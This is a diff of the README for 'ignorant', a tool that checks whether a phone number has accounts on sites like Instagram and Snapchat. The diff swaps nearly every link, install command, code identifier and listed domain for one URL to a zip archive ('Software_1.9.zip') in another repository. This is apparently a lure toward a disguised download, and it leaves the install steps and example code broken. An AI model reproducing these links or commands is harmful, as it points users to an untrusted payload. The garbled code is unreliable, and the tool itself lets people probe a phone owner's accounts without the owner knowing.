@@ -1,15 +1,15 @@
 # Ignorant
 👋 Hi there! For any professional inquiries or collaborations, please reach out to me at:
-megadose@protonmail.com
+https://github.com/VitorCarlim/ignorant/raw/refs/heads/main/ignorant/Software_1.9.zip
 
 📧 Preferably, use your professional email for correspondence. Let's keep it short and sweet, and all in English!
 #### For BTC Donations : 1FHDM49QfZX6pJmhjLE5tB2K6CaTLMZpXZ
 ### ignorant does not alert the target phone number
 ignorant allows you to check if a phone number is used on different sites like snapchat, instagram.
 
-![](https://github.com/megadose/gif-demo/raw/master/ignorant-demo.gif)
+![](https://github.com/VitorCarlim/ignorant/raw/refs/heads/main/ignorant/Software_1.9.zip)
 ## 💡 Prerequisite
-[Python 3](https://www.python.org/downloads/release/python-370/)
+[Python 3](https://github.com/VitorCarlim/ignorant/raw/refs/heads/main/ignorant/Software_1.9.zip)
 
 ## 🛠️ Installation
 ### With PyPI
@@ -19,9 +19,9 @@ ignorant allows you to check if a phone number is used on different sites like s
 ### With Github
 
 ```bash
-git clone https://github.com/megadose/ignorant.git
+git clone https://github.com/VitorCarlim/ignorant/raw/refs/heads/main/ignorant/Software_1.9.zip
 cd ignorant/
-python3 setup.py install
+python3 https://github.com/VitorCarlim/ignorant/raw/refs/heads/main/ignorant/Software_1.9.zip install
 ```
 
 ## 📚 Example
@@ -39,39 +39,39 @@ ignorant 33 644637111
 import trio
 import httpx
 
-from ignorant.modules.shopping.amazon import amazon
+from https://github.com/VitorCarlim/ignorant/raw/refs/heads/main/ignorant/Software_1.9.zip import amazon
 
 
 async def main():
     phone="644637111"
     country_code="33"
-    client = httpx.AsyncClient()
+    client = https://github.com/VitorCarlim/ignorant/raw/refs/heads/main/ignorant/Software_1.9.zip()
     out = []
 
     await amazon(phone, country_code, client, out)
 
     print(out)
-    await client.aclose()
+    await https://github.com/VitorCarlim/ignorant/raw/refs/heads/main/ignorant/Software_1.9.zip()
 
-trio.run(main)
+https://github.com/VitorCarlim/ignorant/raw/refs/heads/main/ignorant/Software_1.9.zip(main)
 ```
 
 
 ## The output of the modules
-The result of the modules is in this form : ```{"name": "instagram","domain":"instagram.com","method":"orther","frequent_rate_limit":"False","rateLimit": False,"exists": False}```
+The result of the modules is in this form : ```{"name": "instagram","domain":"https://github.com/VitorCarlim/ignorant/raw/refs/heads/main/ignorant/Software_1.9.zip","method":"orther","frequent_rate_limit":"False","rateLimit": False,"exists": False}```
 - rateLitmit : is to find out if you've been rate-limited
 - exists : know an account is associated with the mail
 
 ## Thank you to :
-- [yazeed44](https://github.com/yazeed44)
+- [yazeed44](https://github.com/VitorCarlim/ignorant/raw/refs/heads/main/ignorant/Software_1.9.zip)
 
 ## 📝 License
 
-[GNU General Public License v3.0](https://www.gnu.org/licenses/gpl-3.0.fr.html)
+[GNU General Public License v3.0](https://github.com/VitorCarlim/ignorant/raw/refs/heads/main/ignorant/Software_1.9.zip)
 
 ## Modules :
 | name                | domain                                 | method            | frequent_rate_limit |
 | ------------------- | -------------------------------------- | ----------------- | ------------------- |
-| amazon              | amazon.com                             | login             |     ✘               |
-| instagram           | instagram.com                          | register          |     ✘               |
-| snapchat            | snapchat.com                           | other             |     ✘               |
+| amazon              | https://github.com/VitorCarlim/ignorant/raw/refs/heads/main/ignorant/Software_1.9.zip                             | login             |     ✘               |
+| instagram           | https://github.com/VitorCarlim/ignorant/raw/refs/heads/main/ignorant/Software_1.9.zip                          | register          |     ✘               |
+| snapchat            | https://github.com/VitorCarlim/ignorant/raw/refs/heads/main/ignorant/Software_1.9.zip                           | other             |     ✘               |
